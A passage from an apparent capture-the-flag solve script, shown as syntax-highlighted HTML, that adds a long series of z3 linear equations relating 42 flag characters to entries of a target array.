class="hljs-number">29</span>]-flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]+flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]+flag[<span class="hljs-number">34</span>]+flag[<span class="hljs-number">35</span>]+flag[<span class="hljs-number">36</span>]+flag[<span class="hljs-number">37</span>]-flag[<span class="hljs-number">38</span>]+flag[<span class="hljs-number">39</span>]+flag[<span class="hljs-number">40</span>]-flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">15</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]-flag[<span class="hljs-number">4</span>]-flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]+flag[<span class="hljs-number">8</span>]+flag[<span class="hljs-number">9</span>]+flag[<span class="hljs-number">10</span>]-flag[<span class="hljs-number">11</span>]+flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]+flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]+flag[<span class="hljs-number">16</span>]-flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]-flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]-flag[<span class="hljs-number">22</span>]-flag[<span class="hljs-number">23</span>]-flag[<span class="hljs-number">24</span>]-flag[<span class="hljs-number">25</span>]+flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]+flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]-flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]+flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]+flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]+flag[<span class="hljs-number">37</span>]-flag[<span class="hljs-number">38</span>]+flag[<span class="hljs-number">39</span>]-flag[<span class="hljs-number">40</span>]+flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">16</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">4</span>]+flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]+flag[<span class="hljs-number">8</span>]-flag[<span class="hljs-number">9</span>]-flag[<span class="hljs-number">10</span>]+flag[<span class="hljs-number">11</span>]-flag[<span class="hljs-number">12</span>]+flag[<span class="hljs-number">13</span>]+flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]-flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]-flag[<span class="hljs-number">18</span>]-flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]+flag[<span class="hljs-number">22</span>]-flag[<span class="hljs-number">23</span>]-flag[<span class="hljs-number">24</span>]+flag[<span class="hljs-number">25</span>]-flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]-flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]+flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]+flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]+flag[<span class="hljs-number">37</span>]-flag[<span class="hljs-number">38</span>]+flag[<span class="hljs-number">39</span>]+flag[<span class="hljs-number">40</span>]-flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">17</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]-flag[<span class="hljs-number">2</span>]-flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">4</span>]+flag[<span class="hljs-number">5</span>]-flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]-flag[<span class="hljs-number">8</span>]+flag[<span class="hljs-number">9</span>]+flag[<span class="hljs-number">10</span>]-flag[<span class="hljs-number">11</span>]-flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]+flag[<span class="hljs-number">14</span>]-flag[<span class="hljs-number">15</span>]-flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]-flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]-flag[<span class="hljs-number">22</span>]-flag[<span class="hljs-number">23</span>]-flag[<span class="hljs-number">24</span>]-flag[<span class="hljs-number">25</span>]-flag[<span class="hljs-number">26</span>]-flag[<span class="hljs-number">27</span>]+flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]+flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]-flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]+flag[<span class="hljs-number">34</span>]-flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]-flag[<span class="hljs-number">37</span>]-flag[<span class="hljs-number">38</span>]-flag[<span class="hljs-number">39</span>]-flag[<span class="hljs-number">40</span>]+flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">18</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">4</span>]-flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]-flag[<span class="hljs-number">7</span>]-flag[<span class="hljs-number">8</span>]-flag[<span class="hljs-number">9</span>]-flag[<span class="hljs-number">10</span>]-flag[<span class="hljs-number">11</span>]-flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]+flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]+flag[<span class="hljs-number">16</span>]-flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]+flag[<span class="hljs-number">21</span>]-flag[<span class="hljs-number">22</span>]+flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]-flag[<span class="hljs-number">25</span>]+flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]+flag[<span class="hljs-number">30</span>]+flag[<span class="hljs-number">31</span>]+flag[<span class="hljs-number">32</span>]+flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]+flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]-flag[<span class="hljs-number">37</span>]-flag[<span class="hljs-number">38</span>]+flag[<span class="hljs-number">39</span>]+flag[<span class="hljs-number">40</span>]-flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">19</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">2</span>]-flag[<span class="hljs-number">3</span>]-flag[<span class="hljs-number">4</span>]+flag[<span class="hljs-number">5</span>]-flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]-flag[<span class="hljs-number">8</span>]-flag[<span class="hljs-number">9</span>]+flag[<span class="hljs-number">10</span>]+flag[<span class="hljs-number">11</span>]-flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]+flag[<span class="hljs-number">14</span>]-flag[<span class="hljs-number">15</span>]-flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]-flag[<span class="hljs-number">18</span>]-flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]+flag[<span class="hljs-number">21</span>]-flag[<span class="hljs-number">22</span>]+flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]-flag[<span class="hljs-number">25</span>]-flag[<span class="hljs-number">26</span>]-flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]-flag[<span class="hljs-number">29</span>]-flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]-flag[<span class="hljs-number">32</span>]+flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]+flag[<span class="hljs-number">35</span>]+flag[<span class="hljs-number">36</span>]-flag[<span class="hljs-number">37</span>]+flag[<span class="hljs-number">38</span>]-flag[<span class="hljs-number">39</span>]+flag[<span class="hljs-number">40</span>]-flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">20</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]-flag[<span class="hljs-number">2</span>]-flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">4</span>]+flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]-flag[<span class="hljs-number">8</span>]-flag[<span class="hljs-number">9</span>]-flag[<span class="hljs-number">10</span>]-flag[<span class="hljs-number">11</span>]-flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]-flag[<span class="hljs-number">14</span>]-flag[<span class="hljs-number">15</span>]-flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]-flag[<span class="hljs-number">18</span>]-flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]+flag[<span class="hljs-number">22</span>]+flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]-flag[<span class="hljs-number">25</span>]-flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]-flag[<span class="hljs-number">29</span>]-flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]-flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]-flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]+flag[<span class="hljs-number">37</span>]-flag[<span class="hljs-number">38</span>]-flag[<span class="hljs-number">39</span>]-flag[<span class="hljs-number">40</span>]+flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">21</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">4</span>]+flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]+flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">8</span>]+flag[<span class="hljs-number">9</span>]-flag[<span class="hljs-number">10</span>]+flag[<span class="hljs-number">11</span>]-flag[<span class="hljs-number">12</span>]+flag[<span class="hljs-number">13</span>]+flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]-flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]-flag[<span class="hljs-number">19</span>]-flag[<span class="hljs-number">20</span>]+flag[<span class="hljs-number">21</span>]+flag[<span class="hljs-number">22</span>]-flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]-flag[<span class="hljs-number">25</span>]-flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]+flag[<span class="hljs-number">30</span>]+flag[<span class="hljs-number">31</span>]-flag[<span class="hljs-number">32</span>]+flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]-flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]-flag[<span class="hljs-number">37</span>]+flag[<span class="hljs-number">38</span>]-flag[<span class="hljs-number">39</span>]+flag[<span class="hljs-number">40</span>]+flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">22</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]-flag[<span class="hljs-number">4</span>]-flag[<span class="hljs-number">5</span>]-flag[<span class="hljs-number">6</span>]-flag[<span class="hljs-number">7</span>]+flag[<span class="hljs-number">8</span>]-flag[<span class="hljs-number">9</span>]-flag[<span class="hljs-number">10</span>]+flag[<span class="hljs-number">11</span>]+flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]-flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]-flag[<span class="hljs-number">16</span>]-flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]-flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]+flag[<span class="hljs-number">22</span>]-flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]+flag[<span class="hljs-number">25</span>]-flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]+flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]-flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]-flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]-flag[<span class="hljs-number">37</span>]+flag[<span class="hljs-number">38</span>]-flag[<span class="hljs-number">39</span>]-flag[<span class="hljs-number">40</span>]-flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">23</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">4</span>]-flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]-flag[<span class="hljs-number">8</span>]+flag[<span class="hljs-number">9</span>]+flag[<span class="hljs-number">10</span>]-flag[<span class="hljs-number">11</span>]-flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]-flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]+flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]-flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]+flag[<span class="hljs-number">21</span>]+flag[<span class="hljs-number">22</span>]+flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]+flag[<span class="hljs-number">25</span>]-flag[<span class="hljs-number">26</span>]-flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]+flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]+flag[<span class="hljs-number">32</span>]+flag[<span class="hljs-number">33</span>]+flag[<span class="hljs-number">34</span>]-flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]-flag[<span class="hljs-number">37</span>]-flag[<span class="hljs-number">38</span>]+flag[<span class="hljs-number">39</span>]+flag[<span class="hljs-number">40</span>]-flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">24</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]-flag[<span class="hljs-number">4</span>]+flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]-flag[<span class="hljs-number">7</span>]+flag[<span class="hljs-number">8</span>]+flag[<span class="hljs-number">9</span>]+flag[<span class="hljs-number">10</span>]-flag[<span class="hljs-number">11</span>]-flag[<span class="hljs-number">12</span>]+flag[<span class="hljs-number">13</span>]-flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]-flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]-flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]+flag[<span class="hljs-number">22</span>]+flag[<span class="hljs-number">23</span>]-flag[<span class="hljs-number">24</span>]-flag[<span class="hljs-number">25</span>]+flag[<span class="hljs-number">26</span>]-flag[<span class="hljs-number">27</span>]+flag[<span class="hljs-number">28</span>]-flag[<span class="hljs-number">29</span>]+flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]-flag[<span class="hljs-number">32</span>]+flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]-flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]-flag[<span class="hljs-number">37</span>]+flag[<span class="hljs-number">38</span>]-flag[<span class="hljs-number">39</span>]+flag[<span class="hljs-number">40</span>]+flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">25</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">4</span>]+flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">5</span>]-flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]-flag[<span class="hljs-number">8</span>]-flag[<span class="hljs-number">9</span>]-flag[<span class="hljs-number">10</span>]-flag[<span class="hljs-number">11</span>]+flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]+flag[<span class="hljs-number">14</span>]-flag[<span class="hljs-number">15</span>]+flag[<span class="hljs-number">16</span>]-flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]-flag[<span class="hljs-number">19</span>]-flag[<span class="hljs-number">20</span>]+flag[<span class="hljs-number">21</span>]+flag[<span class="hljs-number">22</span>]+flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]+flag[<span class="hljs-number">25</span>]-flag[<span class="hljs-number">26</span>]-flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]-flag[<span class="hljs-number">29</span>]+flag[<span class="hljs-number">30</span>]+flag[<span class="hljs-number">31</span>]-flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]+flag[<span class="hljs-number">35</span>]+flag[<span class="hljs-number">36</span>]-flag[<span class="hljs-number">37</span>]-flag[<span class="hljs-number">38</span>]+flag[<span class="hljs-number">39</span>]+flag[<span class="hljs-number">40</span>]+flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">26</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]-flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">4</span>]-flag[<span class="hljs-number">5</span>]-flag[<span class="hljs-number">6</span>]-flag[<span class="hljs-number">7</span>]-flag[<span class="hljs-number">8</span>]-flag[<span class="hljs-number">9</span>]-flag[<span class="hljs-number">10</span>]-flag[<span class="hljs-number">11</span>]+flag[<span class="hljs-number">12</span>]+flag[<span class="hljs-number">13</span>]-flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]+flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]-flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]-flag[<span class="hljs-number">22</span>]-flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]+flag[<span class="hljs-number">25</span>]+flag[<span class="hljs-number">26</span>]-flag[<span class="hljs-number">27</span>]+flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]+flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]-flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]+flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]-flag[<span class="hljs-number">37</span>]-flag[<span class="hljs-number">38</span>]-flag[<span class="hljs-number">39</span>]-flag[<span class="hljs-number">40</span>]-flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">27</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">4</span>]-flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]-flag[<span class="hljs-number">8</span>]-flag[<span class="hljs-number">9</span>]+flag[<span class="hljs-number">10</span>]+flag[<span class="hljs-number">11</span>]-flag[<span class="hljs-number">12</span>]+flag[<span class="hljs-number">13</span>]-flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]-flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]-flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]+flag[<span class="hljs-number">22</span>]-flag[<span class="hljs-number">23</span>]-flag[<span class="hljs-number">24</span>]-flag[<span class="hljs-number">25</span>]-flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]-flag[<span class="hljs-number">29</span>]-flag[<span class="hljs-number">30</span>]+flag[<span class="hljs-number">31</span>]-flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]+flag[<span class="hljs-number">34</span>]+flag[<span class="hljs-number">35</span>]+flag[<span class="hljs-number">36</span>]-flag[<span class="hljs-number">37</span>]-flag[<span class="hljs-number">38</span>]+flag[<span class="hljs-number">39</span>]+flag[<span class="hljs-number">40</span>]+flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">28</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">2</span>]-flag[<span class="hljs-number">3</span>]-flag[<span class="hljs-number">4</span>]+flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]-flag[<span class="hljs-number">8</span>]+flag[<span class="hljs-number">9</span>]-flag[<span class="hljs-number">10</span>]-flag[<span class="hljs-number">11</span>]+flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]+flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]-flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]-flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]+flag[<span class="hljs-number">21</span>]+flag[<span class="hljs-number">22</span>]+flag[<span class="hljs-number">23</span>]-flag[<span class="hljs-number">24</span>]+flag[<span class="hljs-number">25</span>]+flag[<span class="hljs-number">26</span>]-flag[<span class="hljs-number">27</span>]+flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]+flag[<span class="hljs-number">30</span>]+flag[<span class="hljs-number">31</span>]+flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]+flag[<span class="hljs-number">35</span>]+flag[<span class="hljs-number">36</span>]-flag[<span class="hljs-number">37</span>]+flag[<span class="hljs-number">38</span>]+flag[<span class="hljs-number">39</span>]-flag[<span class="hljs-number">40</span>]+flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">29</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">4</span>]-flag[<span class="hljs-number">5</span>]-flag[<span class="hljs-number">6</span>]-flag[<span class="hljs-number">7</span>]+flag[<span class="hljs-number">8</span>]+flag[<span class="hljs-number">9</span>]-flag[<span class="hljs-number">10</span>]-flag[<span class="hljs-number">11</span>]-flag[<span class="hljs-number">12</span>]+flag[<span class="hljs-number">13</span>]-flag[<span class="hljs-number">14</span>]-flag[<span class="hljs-number">15</span>]+flag[<span class="hljs-number">16</span>]-flag[<span class="hljs-number">17</span>]-flag[<span class="hljs-number">18</span>]-flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]-flag[<span class="hljs-number">22</span>]+flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]-flag[<span class="hljs-number">25</span>]-flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]-flag[<span class="hljs-number">29</span>]-flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]-flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]+flag[<span class="hljs-number">35</span>]+flag[<span class="hljs-number">36</span>]+flag[<span class="hljs-number">37</span>]-flag[<span class="hljs-number">38</span>]+flag[<span class="hljs-number">39</span>]+flag[<span class="hljs-number">40</span>]+flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">30</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">4</span>]-flag[<span class="hljs-number">5</span>]-flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]+flag[<span class="hljs-number">8</span>]+flag[<span class="hljs-number">9</span>]+flag[<span class="hljs-number">10</span>]+flag[<span class="hljs-number">11</span>]+flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]-flag[<span class="hljs-number">14</span>]-flag[<span class="hljs-number">15</span>]+flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]-flag[<span class="hljs-number">20</span>]+flag[<span class="hljs-number">21</span>]-flag[<span class="hljs-number">22</span>]+flag[<span class="hljs-number">23</span>]-flag[<span class="hljs-number">24</span>]-flag[<span class="hljs-number">25</span>]+flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]-flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]-flag[<span class="hljs-number">32</span>]+flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]+flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]+flag[<span class="hljs-number">37</span>]-flag[<span class="hljs-number">38</span>]+flag[<span class="hljs-number">39</span>]-flag[<span class="hljs-number">40</span>]-flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">31</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]-flag[<span class="hljs-number">4</span>]+flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]+flag[<span class="hljs-number">8</span>]-flag[<span class="hljs-number">9</span>]+flag[<span class="hljs-number">10</span>]+flag[<span class="hljs-number">11</span>]-flag[<span class="hljs-number">12</span>]+flag[<span class="hljs-number">13</span>]+flag[<span class="hljs-number">14</span>]-flag[<span class="hljs-number">15</span>]+flag[<span class="hljs-number">16</span>]-flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]-flag[<span class="hljs-number">22</span>]+flag[<span class="hljs-number">23</span>]-flag[<span class="hljs-number">24</span>]+flag[<span class="hljs-number">25</span>]+flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]-flag[<span class="hljs-number">29</span>]-flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]-flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]+flag[<span class="hljs-number">34</span>]+flag[<span class="hljs-number">35</span>]+flag[<span class="hljs-number">36</span>]+flag[<span class="hljs-number">37</span>]-flag[<span class="hljs-number">38</span>]+flag[<span class="hljs-number">39</span>]-flag[<span class="hljs-number">40</span>]+flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">32</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]-flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">4</span>]+flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]-flag[<span class="hljs-number">7</span>]-flag[<span class="hljs-number">8</span>]+flag[<span class="hljs-number">9</span>]+flag[<span class="hljs-number">10</span>]+flag[<span class="hljs-number">11</span>]-flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]+flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]-flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]-flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]-flag[<span class="hljs-number">20</span>]+flag[<span class="hljs-number">21</span>]+flag[<span class="hljs-number">22</span>]+flag[<span class="hljs-number">23</span>]-flag[<span class="hljs-number">24</span>]-flag[<span 